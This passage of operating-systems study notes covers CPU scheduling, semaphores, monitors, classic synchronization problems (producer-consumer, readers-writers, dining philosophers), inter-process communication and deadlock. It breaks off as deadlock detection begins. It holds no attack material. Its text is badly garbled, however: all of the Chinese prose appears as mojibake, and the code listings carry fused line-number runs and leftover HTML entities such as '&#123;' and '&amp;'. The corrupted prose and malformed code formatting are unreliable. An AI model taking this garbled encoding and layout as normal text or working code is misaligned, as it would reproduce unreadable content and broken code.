æŒ‰ä¼°è®¡å‰©ä½™æ—¶é—´æœ€çŸ­çš„é¡ºåºè¿›è¡Œè°ƒåº¦ã€‚ 2. äº¤äº’å¼ç³»ç»Ÿäº¤äº’å¼ç³»ç»Ÿæœ‰å¤§é‡çš„ç”¨æˆ·äº¤äº’æ“ä½œï¼Œåœ¨è¯¥ç³»ç»Ÿä¸­è°ƒåº¦ç®—æ³•çš„ç›®æ ‡æ˜¯å¿«é€Ÿåœ°è¿›è¡Œå“åº”ã€‚ 2.1 æ—¶é—´ç‰‡è½®è½¬ å°†æ‰€æœ‰å°±ç»ªè¿›ç¨‹æŒ‰ FCFS çš„åŸåˆ™æ’æˆä¸€ä¸ªé˜Ÿåˆ—ï¼Œæ¯æ¬¡è°ƒåº¦æ—¶ï¼ŒæŠŠ CPU æ—¶é—´åˆ†é…ç»™é˜Ÿé¦–è¿›ç¨‹ï¼Œè¯¥è¿›ç¨‹å¯ä»¥æ‰§è¡Œä¸€ä¸ªæ—¶é—´ç‰‡ã€‚å½“æ—¶é—´ç‰‡ç”¨å®Œæ—¶ï¼Œç”±è®¡æ—¶å™¨å‘å‡ºæ—¶é’Ÿä¸­æ–­ï¼Œè°ƒåº¦ç¨‹åºä¾¿åœæ­¢è¯¥è¿›ç¨‹çš„æ‰§è¡Œï¼Œå¹¶å°†å®ƒé€å¾€å°±ç»ªé˜Ÿåˆ—çš„æœ«å°¾ï¼ŒåŒæ—¶ç»§ç»­æŠŠ CPU æ—¶é—´åˆ†é…ç»™é˜Ÿé¦–çš„è¿›ç¨‹ã€‚ æ—¶é—´ç‰‡è½®è½¬ç®—æ³•çš„æ•ˆç‡å’Œæ—¶é—´ç‰‡çš„å¤§å°æœ‰å¾ˆå¤§å…³ç³»ã€‚å› ä¸ºè¿›ç¨‹åˆ‡æ¢éƒ½è¦ä¿å­˜è¿›ç¨‹çš„ä¿¡æ¯å¹¶ä¸”è½½å…¥æ–°è¿›ç¨‹çš„ä¿¡æ¯ï¼Œå¦‚æœæ—¶é—´ç‰‡å¤ªå°ï¼Œä¼šå¯¼è‡´è¿›ç¨‹åˆ‡æ¢å¾—å¤ªé¢‘ç¹ï¼Œåœ¨è¿›ç¨‹åˆ‡æ¢ä¸Šå°±ä¼šèŠ±è¿‡å¤šæ—¶é—´ã€‚ 2.2 ä¼˜å…ˆçº§è°ƒåº¦ ä¸ºæ¯ä¸ªè¿›ç¨‹åˆ†é…ä¸€ä¸ªä¼˜å…ˆçº§ï¼ŒæŒ‰ä¼˜å…ˆçº§è¿›è¡Œè°ƒåº¦ã€‚ ä¸ºäº†é˜²æ­¢ä½ä¼˜å…ˆçº§çš„è¿›ç¨‹æ°¸è¿œç­‰ä¸åˆ°è°ƒåº¦ï¼Œå¯ä»¥éšç€æ—¶é—´çš„æ¨ç§»å¢åŠ ç­‰å¾…è¿›ç¨‹çš„ä¼˜å…ˆçº§ã€‚ 2.3 å¤šçº§åé¦ˆé˜Ÿåˆ— å¦‚æœä¸€ä¸ªè¿›ç¨‹éœ€è¦æ‰§è¡Œ 100 ä¸ªæ—¶é—´ç‰‡ï¼Œå¦‚æœé‡‡ç”¨æ—¶é—´ç‰‡è½®è½¬è°ƒåº¦ç®—æ³•ï¼Œé‚£ä¹ˆéœ€è¦äº¤æ¢ 100 æ¬¡ã€‚ å¤šçº§é˜Ÿåˆ—æ˜¯ä¸ºè¿™ç§éœ€è¦è¿ç»­æ‰§è¡Œå¤šä¸ªæ—¶é—´ç‰‡çš„è¿›ç¨‹è€ƒè™‘ï¼Œå®ƒè®¾ç½®äº†å¤šä¸ªé˜Ÿåˆ—ï¼Œæ¯ä¸ªé˜Ÿåˆ—æ—¶é—´ç‰‡å¤§å°éƒ½ä¸åŒï¼Œä¾‹å¦‚ 1,2,4,8,..ã€‚è¿›ç¨‹åœ¨ç¬¬ä¸€ä¸ªé˜Ÿåˆ—æ²¡æ‰§è¡Œå®Œï¼Œå°±ä¼šè¢«ç§»åˆ°ä¸‹ä¸€ä¸ªé˜Ÿåˆ—ã€‚è¿™ç§æ–¹å¼ä¸‹ï¼Œä¹‹å‰çš„è¿›ç¨‹åªéœ€è¦äº¤æ¢ 7 æ¬¡ã€‚ æ¯ä¸ªé˜Ÿåˆ—ä¼˜å…ˆæƒä¹Ÿä¸åŒï¼Œæœ€ä¸Šé¢çš„ä¼˜å…ˆæƒæœ€é«˜ã€‚å› æ­¤åªæœ‰ä¸Šä¸€ä¸ªé˜Ÿåˆ—æ²¡æœ‰è¿›ç¨‹åœ¨æ’é˜Ÿï¼Œæ‰èƒ½è°ƒåº¦å½“å‰é˜Ÿåˆ—ä¸Šçš„è¿›ç¨‹ã€‚ å¯ä»¥å°†è¿™ç§è°ƒåº¦ç®—æ³•çœ‹æˆæ˜¯æ—¶é—´ç‰‡è½®è½¬è°ƒåº¦ç®—æ³•å’Œä¼˜å…ˆçº§è°ƒåº¦ç®—æ³•çš„ç»“åˆã€‚ 3. å®æ—¶ç³»ç»Ÿå®æ—¶ç³»ç»Ÿè¦æ±‚ä¸€ä¸ªè¯·æ±‚åœ¨ä¸€ä¸ªç¡®å®šæ—¶é—´å†…å¾—åˆ°å“åº”ã€‚ åˆ†ä¸ºç¡¬å®æ—¶å’Œè½¯å®æ—¶ï¼Œå‰è€…å¿…é¡»æ»¡è¶³ç»å¯¹çš„æˆªæ­¢æ—¶é—´ï¼Œåè€…å¯ä»¥å®¹å¿ä¸€å®šçš„è¶…æ—¶ã€‚ è¿›ç¨‹åŒæ­¥1. ä¸´ç•ŒåŒºå¯¹ä¸´ç•Œèµ„æºè¿›è¡Œè®¿é—®çš„é‚£æ®µä»£ç ç§°ä¸ºä¸´ç•ŒåŒºã€‚ ä¸ºäº†äº’æ–¥è®¿é—®ä¸´ç•Œèµ„æºï¼Œæ¯ä¸ªè¿›ç¨‹åœ¨è¿›å…¥ä¸´ç•ŒåŒºä¹‹å‰ï¼Œéœ€è¦å…ˆè¿›è¡Œæ£€æŸ¥ã€‚ 123// entry section// critical section;// exit section 2. åŒæ­¥ä¸äº’æ–¥ åŒæ­¥ï¼šå¤šä¸ªè¿›ç¨‹æŒ‰ä¸€å®šé¡ºåºæ‰§è¡Œï¼› äº’æ–¥ï¼šå¤šä¸ªè¿›ç¨‹åœ¨åŒä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ªè¿›ç¨‹èƒ½è¿›å…¥ä¸´ç•ŒåŒºã€‚ 3. ä¿¡å·é‡ä¿¡å·é‡ï¼ˆSemaphoreï¼‰æ˜¯ä¸€ä¸ªæ•´å‹å˜é‡ï¼Œå¯ä»¥å¯¹å…¶æ‰§è¡Œ down å’Œ up æ“ä½œï¼Œä¹Ÿå°±æ˜¯å¸¸è§çš„ P å’Œ V æ“ä½œã€‚ down : å¦‚æœä¿¡å·é‡å¤§äº 0 ï¼Œæ‰§è¡Œ -1 æ“ä½œï¼›å¦‚æœä¿¡å·é‡ç­‰äº 0ï¼Œè¿›ç¨‹ç¡çœ ï¼Œç­‰å¾…ä¿¡å·é‡å¤§äº 0ï¼› up ï¼šå¯¹ä¿¡å·é‡æ‰§è¡Œ +1 æ“ä½œï¼Œå”¤é†’ç¡çœ çš„è¿›ç¨‹è®©å…¶å®Œæˆ down æ“ä½œã€‚ down å’Œ up æ“ä½œéœ€è¦è¢«è®¾è®¡æˆåŸè¯­ï¼Œä¸å¯åˆ†å‰²ï¼Œé€šå¸¸çš„åšæ³•æ˜¯åœ¨æ‰§è¡Œè¿™äº›æ“ä½œçš„æ—¶å€™å±è”½ä¸­æ–­ã€‚ å¦‚æœä¿¡å·é‡çš„å–å€¼åªèƒ½ä¸º 0 æˆ–è€… 1ï¼Œé‚£ä¹ˆå°±æˆä¸ºäº† äº’æ–¥é‡ï¼ˆMutexï¼‰ ï¼Œ0 è¡¨ç¤ºä¸´ç•ŒåŒºå·²ç»åŠ é”ï¼Œ1 è¡¨ç¤ºä¸´ç•ŒåŒºè§£é”ã€‚ 12345678910111213typedef int semaphore;semaphore mutex = 1;void P1() &#123; down(&amp;mutex); // ä¸´ç•ŒåŒº up(&amp;mutex);&#125;void P2() &#123; down(&amp;mutex); // ä¸´ç•ŒåŒº up(&amp;mutex);&#125; ä½¿ç”¨ä¿¡å·é‡å®ç°ç”Ÿäº§è€…-æ¶ˆè´¹è€…é—®é¢˜ é—®é¢˜æè¿°ï¼šä½¿ç”¨ä¸€ä¸ªç¼“å†²åŒºæ¥ä¿å­˜ç‰©å“ï¼Œåªæœ‰ç¼“å†²åŒºæ²¡æœ‰æ»¡ï¼Œç”Ÿäº§è€…æ‰å¯ä»¥æ”¾å…¥ç‰©å“ï¼›åªæœ‰ç¼“å†²åŒºä¸ä¸ºç©ºï¼Œæ¶ˆè´¹è€…æ‰å¯ä»¥æ‹¿èµ°ç‰©å“ã€‚ å› ä¸ºç¼“å†²åŒºå±äºä¸´ç•Œèµ„æºï¼Œå› æ­¤éœ€è¦ä½¿ç”¨ä¸€ä¸ªäº’æ–¥é‡ mutex æ¥æ§åˆ¶å¯¹ç¼“å†²åŒºçš„äº’æ–¥è®¿é—®ã€‚ ä¸ºäº†åŒæ­¥ç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…çš„è¡Œä¸ºï¼Œéœ€è¦è®°å½•ç¼“å†²åŒºä¸­ç‰©å“çš„æ•°é‡ã€‚æ•°é‡å¯ä»¥ä½¿ç”¨ä¿¡å·é‡æ¥è¿›è¡Œç»Ÿè®¡ï¼Œè¿™é‡Œéœ€è¦ä½¿ç”¨ä¸¤ä¸ªä¿¡å·é‡ï¼šempty è®°å½•ç©ºç¼“å†²åŒºçš„æ•°é‡ï¼Œfull è®°å½•æ»¡ç¼“å†²åŒºçš„æ•°é‡ã€‚å…¶ä¸­ï¼Œempty ä¿¡å·é‡æ˜¯åœ¨ç”Ÿäº§è€…è¿›ç¨‹ä¸­ä½¿ç”¨ï¼Œå½“ empty ä¸ä¸º 0 æ—¶ï¼Œç”Ÿäº§è€…æ‰å¯ä»¥æ”¾å…¥ç‰©å“ï¼›full ä¿¡å·é‡æ˜¯åœ¨æ¶ˆè´¹è€…è¿›ç¨‹ä¸­ä½¿ç”¨ï¼Œå½“ full ä¿¡å·é‡ä¸ä¸º 0 æ—¶ï¼Œæ¶ˆè´¹è€…æ‰å¯ä»¥å–èµ°ç‰©å“ã€‚ æ³¨æ„ï¼Œä¸èƒ½å…ˆå¯¹ç¼“å†²åŒºè¿›è¡ŒåŠ é”ï¼Œå†æµ‹è¯•ä¿¡å·é‡ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸èƒ½å…ˆæ‰§è¡Œ down(mutex) å†æ‰§è¡Œ down(empty)ã€‚å¦‚æœè¿™ä¹ˆåšäº†ï¼Œé‚£ä¹ˆå¯èƒ½ä¼šå‡ºç°è¿™ç§æƒ…å†µï¼šç”Ÿäº§è€…å¯¹ç¼“å†²åŒºåŠ é”åï¼Œæ‰§è¡Œ down(empty) æ“ä½œï¼Œå‘ç° empty = 0ï¼Œæ­¤æ—¶ç”Ÿäº§è€…ç¡çœ ã€‚æ¶ˆè´¹è€…ä¸èƒ½è¿›å…¥ä¸´ç•ŒåŒºï¼Œå› ä¸ºç”Ÿäº§è€…å¯¹ç¼“å†²åŒºåŠ é”äº†ï¼Œä¹Ÿå°±æ— æ³•æ‰§è¡Œ up(empty) æ“ä½œï¼Œempty æ°¸è¿œéƒ½ä¸º 0ï¼Œé‚£ä¹ˆç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…å°±ä¼šä¸€ç›´ç­‰å¾…ä¸‹å»ï¼Œé€ æˆæ­»é”ã€‚ 123456789101112131415161718192021222324252627#define N 100typedef int semaphore;semaphore mutex = 1;semaphore empty = N;semaphore full = 0;void producer() &#123; while(TRUE)&#123; int item = produce_item(); down(&amp;empty); down(&amp;mutex); insert_item(item); up(&amp;mutex); up(&amp;full); &#125;&#125;void consumer() &#123; while(TRUE)&#123; down(&amp;full); down(&amp;mutex); int item = remove_item(); up(&amp;mutex); up(&amp;empty); consume_item(item); &#125;&#125; 4. ç®¡ç¨‹ä½¿ç”¨ä¿¡å·é‡æœºåˆ¶å®ç°çš„ç”Ÿäº§è€…æ¶ˆè´¹è€…é—®é¢˜éœ€è¦å®¢æˆ·ç«¯ä»£ç åšå¾ˆå¤šæ§åˆ¶ï¼Œè€Œç®¡ç¨‹æŠŠæ§åˆ¶çš„ä»£ç ç‹¬ç«‹å‡ºæ¥ï¼Œä¸ä»…ä¸å®¹æ˜“å‡ºé”™ï¼Œä¹Ÿä½¿å¾—å®¢æˆ·ç«¯ä»£ç è°ƒç”¨æ›´å®¹æ˜“ã€‚ c è¯­è¨€ä¸æ”¯æŒç®¡ç¨‹ï¼Œä¸‹é¢çš„ç¤ºä¾‹ä»£ç ä½¿ç”¨äº†ç±» Pascal è¯­è¨€æ¥æè¿°ç®¡ç¨‹ã€‚ç¤ºä¾‹ä»£ç çš„ç®¡ç¨‹æä¾›äº† insert() å’Œ remove() æ–¹æ³•ï¼Œå®¢æˆ·ç«¯ä»£ç é€šè¿‡è°ƒç”¨è¿™ä¸¤ä¸ªæ–¹æ³•æ¥è§£å†³ç”Ÿäº§è€…-æ¶ˆè´¹è€…é—®é¢˜ã€‚ 1234567891011121314monitor ProducerConsumer integer i; condition c; procedure insert(); begin // ... end; procedure remove(); begin // ... end;end monitor; ç®¡ç¨‹æœ‰ä¸€ä¸ªé‡è¦ç‰¹æ€§ï¼šåœ¨ä¸€ä¸ªæ—¶åˆ»åªèƒ½æœ‰ä¸€ä¸ªè¿›ç¨‹ä½¿ç”¨ç®¡ç¨‹ã€‚è¿›ç¨‹åœ¨æ— æ³•ç»§ç»­æ‰§è¡Œçš„æ—¶å€™ä¸èƒ½ä¸€ç›´å ç”¨ç®¡ç¨‹ï¼Œå¦è€…å…¶å®ƒè¿›ç¨‹æ°¸è¿œä¸èƒ½ä½¿ç”¨ç®¡ç¨‹ã€‚ ç®¡ç¨‹å¼•å…¥äº† æ¡ä»¶å˜é‡ ä»¥åŠç›¸å…³çš„æ“ä½œï¼šwait() å’Œ signal() æ¥å®ç°åŒæ­¥æ“ä½œã€‚å¯¹æ¡ä»¶å˜é‡æ‰§è¡Œ wait() æ“ä½œä¼šå¯¼è‡´è°ƒç”¨è¿›ç¨‹é˜»å¡ï¼ŒæŠŠç®¡ç¨‹è®©å‡ºæ¥ç»™å¦ä¸€ä¸ªè¿›ç¨‹æŒæœ‰ã€‚signal() æ“ä½œç”¨äºå”¤é†’è¢«é˜»å¡çš„è¿›ç¨‹ã€‚ ä½¿ç”¨ç®¡ç¨‹å®ç°ç”Ÿæˆè€…-æ¶ˆè´¹è€…é—®é¢˜ 123456789101112131415161718192021222324252627282930313233343536373839404142// ç®¡ç¨‹monitor ProducerConsumer condition full, empty; integer count := 0; condition c; procedure insert(item: integer); begin if count = N then wait(full); insert_item(item); count := count + 1; if count = 1 then signal(empty); end; function remove: integer; begin if count = 0 then wait(empty); remove = remove_item; count := count - 1; if count = N -1 then signal(full); end;end monitor;// ç”Ÿäº§è€…å®¢æˆ·ç«¯procedure producerbegin while true do begin item = produce_item; ProducerConsumer.insert(item); endend;// æ¶ˆè´¹è€…å®¢æˆ·ç«¯procedure consumerbegin while true do begin item = ProducerConsumer.remove; consume_item(item); endend; ç»å…¸åŒæ­¥é—®é¢˜ç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…é—®é¢˜å‰é¢å·²ç»è®¨è®ºè¿‡äº†ã€‚ 1. è¯»è€…-å†™è€…é—®é¢˜å…è®¸å¤šä¸ªè¿›ç¨‹åŒæ—¶å¯¹æ•°æ®è¿›è¡Œè¯»æ“ä½œï¼Œä½†æ˜¯ä¸å…è®¸è¯»å’Œå†™ä»¥åŠå†™å’Œå†™æ“ä½œåŒæ—¶å‘ç”Ÿã€‚ ä¸€ä¸ªæ•´å‹å˜é‡ count è®°å½•åœ¨å¯¹æ•°æ®è¿›è¡Œè¯»æ“ä½œçš„è¿›ç¨‹æ•°é‡ï¼Œä¸€ä¸ªäº’æ–¥é‡ count_mutex ç”¨äºå¯¹ count åŠ é”ï¼Œä¸€ä¸ªäº’æ–¥é‡ data_mutex ç”¨äºå¯¹è¯»å†™çš„æ•°æ®åŠ é”ã€‚ 1234567891011121314151617181920212223242526typedef int semaphore;semaphore count_mutex = 1;semaphore data_mutex = 1;int count = 0;void reader() &#123; while(TRUE) &#123; down(&amp;count_mutex); count++; if(count == 1) down(&amp;data_mutex); // ç¬¬ä¸€ä¸ªè¯»è€…éœ€è¦å¯¹æ•°æ®è¿›è¡ŒåŠ é”ï¼Œé˜²æ­¢å†™è¿›ç¨‹è®¿é—® up(&amp;count_mutex); read(); down(&amp;count_mutex); count--; if(count == 0) up(&amp;data_mutex); up(&amp;count_mutex); &#125;&#125;void writer() &#123; while(TRUE) &#123; down(&amp;data_mutex); write(); up(&amp;data_mutex); &#125;&#125; 2. å“²å­¦å®¶è¿›é¤é—®é¢˜ äº”ä¸ªå“²å­¦å®¶å›´ç€ä¸€å¼ åœ†æ¡Œï¼Œæ¯ä¸ªå“²å­¦å®¶é¢å‰æ”¾ç€é£Ÿç‰©ã€‚å“²å­¦å®¶çš„ç”Ÿæ´»æœ‰ä¸¤ç§äº¤æ›¿æ´»åŠ¨ï¼šåƒé¥­ä»¥åŠæ€è€ƒã€‚å½“ä¸€ä¸ªå“²å­¦å®¶åƒé¥­æ—¶ï¼Œéœ€è¦å…ˆæ‹¿èµ·è‡ªå·±å·¦å³ä¸¤è¾¹çš„ä¸¤æ ¹ç­·å­ï¼Œå¹¶ä¸”ä¸€æ¬¡åªèƒ½æ‹¿èµ·ä¸€æ ¹ç­·å­ã€‚ ä¸‹é¢æ˜¯ä¸€ç§é”™è¯¯çš„è§£æ³•ï¼Œè€ƒè™‘åˆ°å¦‚æœæ‰€æœ‰å“²å­¦å®¶åŒæ—¶æ‹¿èµ·å·¦æ‰‹è¾¹çš„ç­·å­ï¼Œé‚£ä¹ˆå°±æ— æ³•æ‹¿èµ·å³æ‰‹è¾¹çš„ç­·å­ï¼Œé€ æˆæ­»é”ã€‚ 123456789101112#define N 5void philosopher(int i) &#123; while(TRUE) &#123; think(); take(i); // æ‹¿èµ·å·¦è¾¹çš„ç­·å­ take((i+1)%N); // æ‹¿èµ·å³è¾¹çš„ç­·å­ eat(); put(i); put((i+1)%N); &#125;&#125; ä¸ºäº†é˜²æ­¢æ­»é”çš„å‘ç”Ÿï¼Œå¯ä»¥è®¾ç½®ä¸¤ä¸ªæ¡ä»¶ï¼š å¿…é¡»åŒæ—¶æ‹¿èµ·å·¦å³ä¸¤æ ¹ç­·å­ï¼› åªæœ‰åœ¨ä¸¤ä¸ªé‚»å±…éƒ½æ²¡æœ‰è¿›é¤çš„æƒ…å†µä¸‹æ‰å…è®¸è¿›é¤ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142#define N 5#define LEFT (i + N - 1) % N // å·¦é‚»å±…#define RIGHT (i + 1) % N // å³é‚»å±…#define THINKING 0#define HUNGRY 1#define EATING 2typedef int semaphore;int state[N]; // è·Ÿè¸ªæ¯ä¸ªå“²å­¦å®¶çš„çŠ¶æ€semaphore mutex = 1; // ä¸´ç•ŒåŒºçš„äº’æ–¥semaphore s[N]; // æ¯ä¸ªå“²å­¦å®¶ä¸€ä¸ªä¿¡å·é‡void philosopher(int i) &#123; while(TRUE) &#123; think(); take_two(i); eat(); put_tow(i); &#125;&#125;void take_two(int i) &#123; down(&amp;mutex); state[i] = HUNGRY; test(i); up(&amp;mutex); down(&amp;s[i]);&#125;void put_tow(i) &#123; down(&amp;mutex); state[i] = THINKING; test(LEFT); test(RIGHT); up(&amp;mutex);&#125;void test(i) &#123; // å°è¯•æ‹¿èµ·ä¸¤æŠŠç­·å­ if(state[i] == HUNGRY &amp;&amp; state[LEFT] != EATING &amp;&amp; state[RIGHT] !=EATING) &#123; state[i] = EATING; up(&amp;s[i]); &#125;&#125; è¿›ç¨‹é€šä¿¡è¿›ç¨‹åŒæ­¥ä¸è¿›ç¨‹é€šä¿¡å¾ˆå®¹æ˜“æ··æ·†ï¼Œå®ƒä»¬çš„åŒºåˆ«åœ¨äºï¼š è¿›ç¨‹åŒæ­¥ï¼šæ§åˆ¶å¤šä¸ªè¿›ç¨‹æŒ‰ä¸€å®šé¡ºåºæ‰§è¡Œï¼› è¿›ç¨‹é€šä¿¡ï¼šè¿›ç¨‹é—´ä¼ è¾“ä¿¡æ¯ã€‚ è¿›ç¨‹é€šä¿¡æ˜¯ä¸€ç§æ‰‹æ®µï¼Œè€Œè¿›ç¨‹åŒæ­¥æ˜¯ä¸€ç§ç›®çš„ã€‚ä¹Ÿå¯ä»¥è¯´ï¼Œä¸ºäº†èƒ½å¤Ÿè¾¾åˆ°è¿›ç¨‹åŒæ­¥çš„ç›®çš„ï¼Œéœ€è¦è®©è¿›ç¨‹è¿›è¡Œé€šä¿¡ï¼Œä¼ è¾“ä¸€äº›è¿›ç¨‹åŒæ­¥æ‰€éœ€è¦çš„ä¿¡æ¯ã€‚ 1. ç®¡é“ç®¡é“æ˜¯é€šè¿‡è°ƒç”¨ pipe å‡½æ•°åˆ›å»ºçš„ï¼Œfd[0] ç”¨äºè¯»ï¼Œfd[1] ç”¨äºå†™ã€‚ 12#include &lt;unistd.h&gt;int pipe(int fd[2]); å®ƒå…·æœ‰ä»¥ä¸‹é™åˆ¶ï¼š åªæ”¯æŒåŠåŒå·¥é€šä¿¡ï¼ˆå•å‘ä¼ è¾“ï¼‰ï¼› åªèƒ½åœ¨çˆ¶å­è¿›ç¨‹ä¸­ä½¿ç”¨ã€‚ 2. FIFOä¹Ÿç§°ä¸ºå‘½åç®¡é“ï¼Œå»é™¤äº†ç®¡é“åªèƒ½åœ¨çˆ¶å­è¿›ç¨‹ä¸­ä½¿ç”¨çš„é™åˆ¶ã€‚ 123#include &lt;sys/stat.h&gt;int mkfifo(const char *path, mode_t mode);int mkfifoat(int fd, const char *path, mode_t mode); FIFO å¸¸ç”¨äºå®¢æˆ·-æœåŠ¡å™¨åº”ç”¨ç¨‹åºä¸­ï¼ŒFIFO ç”¨ä½œæ±‡èšç‚¹ï¼Œåœ¨å®¢æˆ·è¿›ç¨‹å’ŒæœåŠ¡å™¨è¿›ç¨‹ä¹‹é—´ä¼ é€’æ•°æ®ã€‚ 3. æ¶ˆæ¯é˜Ÿåˆ—ç›¸æ¯”äº FIFOï¼Œæ¶ˆæ¯é˜Ÿåˆ—å…·æœ‰ä»¥ä¸‹ä¼˜ç‚¹ï¼š æ¶ˆæ¯é˜Ÿåˆ—å¯ä»¥ç‹¬ç«‹äºè¯»å†™è¿›ç¨‹å­˜åœ¨ï¼Œä»è€Œé¿å…äº† FIFO ä¸­åŒæ­¥ç®¡é“çš„æ‰“å¼€å’Œå…³é—­æ—¶å¯èƒ½äº§ç”Ÿçš„å›°éš¾ï¼› é¿å…äº† FIFO çš„åŒæ­¥é˜»å¡é—®é¢˜ï¼Œä¸éœ€è¦è¿›ç¨‹è‡ªå·±æä¾›åŒæ­¥æ–¹æ³•ï¼› è¯»è¿›ç¨‹å¯ä»¥æ ¹æ®æ¶ˆæ¯ç±»å‹æœ‰é€‰æ‹©åœ°æ¥æ”¶æ¶ˆæ¯ï¼Œè€Œä¸åƒ FIFO é‚£æ ·åªèƒ½é»˜è®¤åœ°æ¥æ”¶ã€‚ 4. ä¿¡å·é‡å®ƒæ˜¯ä¸€ä¸ªè®¡æ•°å™¨ï¼Œç”¨äºä¸ºå¤šä¸ªè¿›ç¨‹æä¾›å¯¹å…±äº«æ•°æ®å¯¹è±¡çš„è®¿é—®ã€‚ 5. å…±äº«å­˜å‚¨å…è®¸å¤šä¸ªè¿›ç¨‹å…±äº«ä¸€ä¸ªç»™å®šçš„å­˜å‚¨åŒºã€‚å› ä¸ºæ•°æ®ä¸éœ€è¦åœ¨è¿›ç¨‹ä¹‹é—´å¤åˆ¶ï¼Œæ‰€ä»¥è¿™æ˜¯æœ€å¿«çš„ä¸€ç§ IPCã€‚ éœ€è¦ä½¿ç”¨ä¿¡å·é‡ç”¨æ¥åŒæ­¥å¯¹å…±äº«å­˜å‚¨çš„è®¿é—®ã€‚ å¤šä¸ªè¿›ç¨‹å¯ä»¥å°†åŒä¸€ä¸ªæ–‡ä»¶æ˜ å°„åˆ°å®ƒä»¬çš„åœ°å€ç©ºé—´ä»è€Œå®ç°å…±äº«å†…å­˜ã€‚å¦å¤– XSI å…±äº«å†…å­˜ä¸æ˜¯ä½¿ç”¨æ–‡ä»¶ï¼Œè€Œæ˜¯ä½¿ç”¨ä½¿ç”¨å†…å­˜çš„åŒ¿åæ®µã€‚ 6. å¥—æ¥å­—ä¸å…¶å®ƒé€šä¿¡æœºåˆ¶ä¸åŒçš„æ˜¯ï¼Œå®ƒå¯ç”¨äºä¸åŒæœºå™¨é—´çš„è¿›ç¨‹é€šä¿¡ã€‚ ä¸‰ã€æ­»é”æ­»é”çš„å¿…è¦æ¡ä»¶ äº’æ–¥ï¼šæ¯ä¸ªèµ„æºè¦ä¹ˆå·²ç»åˆ†é…ç»™äº†ä¸€ä¸ªè¿›ç¨‹ï¼Œè¦ä¹ˆå°±æ˜¯å¯ç”¨çš„ã€‚ å æœ‰å’Œç­‰å¾…ï¼šå·²ç»å¾—åˆ°äº†æŸä¸ªèµ„æºçš„è¿›ç¨‹å¯ä»¥å†è¯·æ±‚æ–°çš„èµ„æºã€‚ ä¸å¯æŠ¢å ï¼šå·²ç»åˆ†é…ç»™ä¸€ä¸ªè¿›ç¨‹çš„èµ„æºä¸èƒ½å¼ºåˆ¶æ€§åœ°è¢«æŠ¢å ï¼Œå®ƒåªèƒ½è¢«å æœ‰å®ƒçš„è¿›ç¨‹æ˜¾å¼åœ°é‡Šæ”¾ã€‚ ç¯è·¯ç­‰å¾…ï¼šæœ‰ä¸¤ä¸ªæˆ–è€…ä¸¤ä¸ªä»¥ä¸Šçš„è¿›ç¨‹ç»„æˆä¸€æ¡ç¯è·¯ï¼Œè¯¥ç¯è·¯ä¸­çš„æ¯ä¸ªè¿›ç¨‹éƒ½åœ¨ç­‰å¾…ä¸‹ä¸€ä¸ªè¿›ç¨‹æ‰€å æœ‰çš„èµ„æºã€‚ æ­»é”çš„å¤„ç†æ–¹æ³•1. é¸µé¸Ÿç­–ç•¥æŠŠå¤´åŸ‹åœ¨æ²™å­é‡Œï¼Œå‡è£…æ ¹æœ¬æ²¡å‘ç”Ÿé—®é¢˜ã€‚ å› ä¸ºè§£å†³æ­»é”é—®é¢˜çš„ä»£ä»·å¾ˆé«˜ï¼Œå› æ­¤é¸µé¸Ÿç­–ç•¥è¿™ç§ä¸é‡‡å–ä»»åŠ¡æªæ–½çš„æ–¹æ¡ˆä¼šè·å¾—æ›´é«˜çš„æ€§èƒ½ã€‚å½“å‘ç”Ÿæ­»é”æ—¶ä¸ä¼šå¯¹ç”¨æˆ·é€ æˆå¤šå¤§å½±å“ï¼Œæˆ–å‘ç”Ÿæ­»é”çš„æ¦‚ç‡å¾ˆä½ï¼Œå¯ä»¥é‡‡ç”¨é¸µé¸Ÿç­–ç•¥ã€‚ å¤§å¤šæ•°æ“ä½œç³»ç»Ÿï¼ŒåŒ…æ‹¬ Unixï¼ŒLinux å’Œ Windowsï¼Œå¤„ç†æ­»é”é—®é¢˜çš„åŠæ³•ä»…ä»…æ˜¯å¿½ç•¥å®ƒã€‚ 2. æ­»é”æ£€æµ‹ä¸æ­»é”æ¢å¤ä¸è¯•å›¾é˜»æ­¢æ­»é”ï¼Œè€Œæ˜¯å½“æ£€æµ‹åˆ°æ­»é”å‘ç”Ÿæ—¶ï¼Œé‡‡å–æªæ–½è¿›è¡Œæ¢å¤ã€‚ ï¼ˆä¸€ï¼‰æ¯ç§ç±»å‹ä¸€ä¸ªèµ„æºçš„æ­»é”æ£€æµ‹ ä¸Šå›¾ä¸ºèµ„æºåˆ†é…å›¾ï¼Œå…¶ä¸­æ–¹æ¡†è¡¨ç¤ºèµ„æºï¼Œåœ†åœˆè¡¨ç¤ºè¿›ç¨‹ã€‚èµ„æºæŒ‡å‘è¿›ç¨‹è¡¨ç¤ºè¯¥èµ„æºå·²ç»åˆ†é…ç»™è¯¥è¿›ç¨‹ï¼Œè¿›ç¨‹æŒ‡å‘èµ„æºè¡¨ç¤ºè¿›ç¨‹è¯·æ±‚è·å–è¯¥èµ„æºã€‚ å›¾ a å¯ä»¥æŠ½å–å‡ºç¯ï¼Œå¦‚å›¾ bï¼Œå®ƒæ»¡è¶³äº†ç¯è·¯ç­‰å¾…æ¡ä»¶ï¼Œå› æ­¤ä¼šå‘ç”Ÿæ­»é”ã€‚ æ¯ç§ç±»å‹ä¸€ä¸ªèµ„æºçš„æ­»é”æ£€æµ‹ç®—æ³•æ˜¯é€šè¿‡æ£€æµ‹æœ‰å‘å›¾æ˜¯å¦å­˜åœ¨ç¯æ¥å®ç°ï¼Œä»ä¸€ä¸ªèŠ‚ç‚¹å‡ºå‘è¿›è¡Œæ·±åº¦ä¼˜å…ˆæœç´¢ï¼Œå¯¹è®¿é—®è¿‡çš„èŠ‚ç‚¹è¿›è¡Œæ ‡è®°ï¼Œå¦‚æœè®¿é—®äº†å·²ç»æ ‡è®°çš„èŠ‚ç‚¹ï¼Œå°±è¡¨ç¤ºæœ‰å‘å›¾å­˜åœ¨ç¯ï¼Œä¹Ÿå°±æ˜¯æ£€æµ‹åˆ°æ­»é”çš„å‘ç”Ÿã€‚ ï¼ˆäºŒï¼‰æ¯ç§ç±»å‹å¤šä¸ªèµ„æºçš„æ­»é”æ£€æµ‹ 